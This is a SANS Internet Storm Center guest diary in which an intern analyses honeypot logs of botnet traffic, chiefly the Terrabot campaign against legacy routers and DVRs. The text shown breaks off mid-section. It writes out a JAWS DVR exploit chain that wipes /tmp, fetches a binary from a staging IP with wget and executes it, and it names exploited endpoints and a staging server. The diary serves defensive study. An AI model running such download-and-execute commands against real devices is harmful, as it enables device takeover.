---
title: What do Ports Hear When Nobody's Listening&#x3f; An Assessment of Automated Cybercrime &#x5b;Guest Diary&#x5d;, (Wed, Jun 24th)
url: https://isc.sans.edu/diary/rss/33104
source: SANS Internet Storm Center, InfoCON: green
date: 2026-06-25
fetch_date: 2026-06-26T06:09:43.247691
---

# What do Ports Hear When Nobody's Listening&#x3f; An Assessment of Automated Cybercrime &#x5b;Guest Diary&#x5d;, (Wed, Jun 24th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Guy Bruneau](/handler_list.html#guy-bruneau "Guy Bruneau")

Threat Level: [green](/infocon.html)

* [previous](/diary/33102)

Click HERE to learn more about classes Guy is teaching for SANS

# [What do Ports Hear When Nobody's Listening? An Assessment of Automated Cybercrime [Guest Diary]](/forums/diary/What%2Bdo%2BPorts%2BHear%2BWhen%2BNobodys%2BListening%2BAn%2BAssessment%2Bof%2BAutomated%2BCybercrime%2BGuest%2BDiary/33104/)

**Published**: 2026-06-24. **Last Updated**: 2026-06-25 10:01:19 UTC
**by** [Nicole Phillips, SANS.edu BACS Student](/handler_list.html#nicole-phillips,-sans.edu-bacs-student) (Version: 1)

[0 comment(s)](/diary/What%2Bdo%2BPorts%2BHear%2BWhen%2BNobodys%2BListening%2BAn%2BAssessment%2Bof%2BAutomated%2BCybercrime%2BGuest%2BDiary/33104/#comments)

[This is a Guest Diary by Nicole Phillips, an ISC intern as part of the [SANS.edu](https://www.sans.edu/cyber-security-programs/bachelors-degree/) BACS program]

"*I was just sitting here enjoying the company. Plants got a lot to say, if you take the time to listen.*"
— Eeyore, Winnie the Pooh

**Introduction: Listening to the Static**

Setting up and contributing to the DShield honeypot project [[1](https://isc.sans.edu/honeypot.html)] as an ISC intern is a meaningful part of the BACS program at SANS [2]. Over the last several months I've been thrilled to observe real-time SSH/Telnet activity, check every new file hash and TTY log and hunt for unique http requests. That said, reviewing raw honeypot logs can feel overwhelming. Every day, public facing servers are bombarded by millions of identical hits, mostly automated, creating a fog of noise that seems repetitive, yet disconnected and chaotic. After seeing the same sequence of activity day in and day out, it becomes easy to dismiss traffic as loud background static.

But like Eeyore's observation of the Hundred Acre Wood, the background noise has a lot to say if you stop to listen. Witnessing the noise helps you understand how to recognize the anomalies. When slowing down and looking more closely at patterns, the fog lifts, revealing layers of orchestration in an automated shadow economy that increasingly drives my curiosity.

• What are automated botnets and scanners?
• How do they operate?
• What are they looking for?
• What or who operates behind the scenes, and how mature are their engineering tactics?

While I'm unable to fully answer these questions, I will try to deconstruct some of the malicious automated background noise at several tiers, tracing its trajectory from low-level mechanical slips and overlaps to human-mimicking deception.

A note on attribution: The assessment that follows references each operation based on its observed "User-Agent" identifier to cluster specific infrastructure and automated behavior; it does not imply definitive attribution of the activity to the original botnet developers.

**The Commodity Layer: Surface Noise**

Much of the malicious noise consists of bots and automated scripts scanning blindly for vulnerable IoT devices. These are the weeds of this ecosystem, initially ignored, until one day the entire garden is overrun. In the digital space, this appears as low-level static. It's easy to assume that exploits will reveal themselves out of the static through standard telemetry. I've learned through this internship, however, that malicious activity at this layer is much simpler. Attackers are not knocking down doors; they are walking right through them. Because so much of network defense is inherently reactive, a lot of this activity simply gets missed.

While the operators exhibit technical limitations and sloppy mistakes, they succeed because they are paying attention. Through automation, mass trial and error campaigns, and volume that outpaces patching and CVEs, these operators can find and weaponize simple gaps that go unnoticed. My web honeypot captured traffic that illustrates this dynamic.

**Terrabot: The Disposable Swarm**

TerraBot is an aggressive IoT botnet variant derived from Mirai and Gafgyt source code frameworks that scans the internet for exploits to weaponize and build its network of compromised devices [[3](http://https://www.socdefenders.ai/threats/07c347ba-6a9c-44bc-956d-5dde426c673d)]. The User-Agent string, terrabot-owned-you appears repeatedly in my logs. Between May 28 and June 9 my honeypot saw 24 hits from 24 unique IPs, all with the same User-Agent string.

The vast majority – 17 of the 24 hits – targeted the /GponForm/diag\_Form?images/ endpoint, while 6 hits delivered a payload targeting a known unauthenticated command injection vulnerability affecting legacy D-Link DSL gateway routers ([CVE-2016-20017)](https://nvd.nist.gov/vuln/detail/cve-2016-20017) using a staging server at hxxp://140[.]233.190, 47.as shown below:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic1.png)
Figure 1: Terrabot payload attempting unauthenticated command injection against legacy D-Link DSL routers ([CVE-2016-20017](https://nvd.nist.gov/vuln/detail/cve-2016-20017))

Interestingly, Terrabot's automation failures begin with the first hit in my logs, a POST request to /GponForm/diag\_Form?images/ attempting to exploit an authentication bypass flaw ([CVE-2018-10561](https://nvd.nist.gov/vuln/detail/cve-2018-10561)) in Dasan GPON routers.  While the logs show the correctly formatted URL string, the exploit requires the POST action to actively inject the malicious payload into the router's ping diagnostic tool via the request body. My logs show each of these hits as entirely empty. This botnet was not performing reconnaissance; it was shooting blanks. Activity against these two endpoints continued over the next 11 days, always from unique IPs.

Terrabot's campaign ends with a stand-alone event that further confirms its brokenness. On June 9,  the following request hit from source IP: 176.116.165.207:

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic2.png)

The payload above targets a well-known unauthenticated remote code execution (RCE) backdoor found in legacy MVPower CCTV DVRs, commonly known as the JAWS Webserver RCE (CVE-2016-20016), exploited in the wild between 2017 and 2022. The "JAWS" reference relates to the embedded JAWS web-server and self-identification in HTTP response headers.

Had the request been correctly formatted, the /shell endpoint would have executed in the device's root terminal as follows:

• cd /tmp; rm -rf \* - **Eviction**: the bot clears out temporary memory to aggressively wipe out competing malware strains or previous installs
• wget+140.233.190.47/jaws - **Staging Endpoint**: the device reaches out to fetch the jaws binary, hosted on a known malicious endpoint
• chmod 777 jaws; sh jaws; ./jaws - **Execution**: this forces max permissions and attempts to execute the payload simultaneously as both a shell script and compiled binary to ensure successful takeover.

This exploit failed due to a simple formatting bug. The script author inserted an unencoded, raw space character directly after wget+ instead of standard URL encoding, causing the web server to reject the request. In HTTP protocol formatting, a single blank space acts as a delimiter separating the URI path from the HTTP Version string. Because of this unencoded space, the honeypot immediately rejected the connection with a 400 Bad Request Syntax error, highlighting sloppy, copy-pasted scripting templates that break due to simple human errors.

![](https://isc.sans.edu/diaryimages/images/Nicole_Phillips_pic3.png)
Figure 2: Wireshark stream showing honeypot returning HTTP 400 Bad Request syntax error

After a short burst of static, this event on June 9, 2026 is the last appearance of Terrabot in my logs. That said, its presence on the /login.cgi?cli=... endpoint marks the spot where it crossed paths with a more structurally sound campaign.

**r00ts3c: The Tactical Shift**

A ...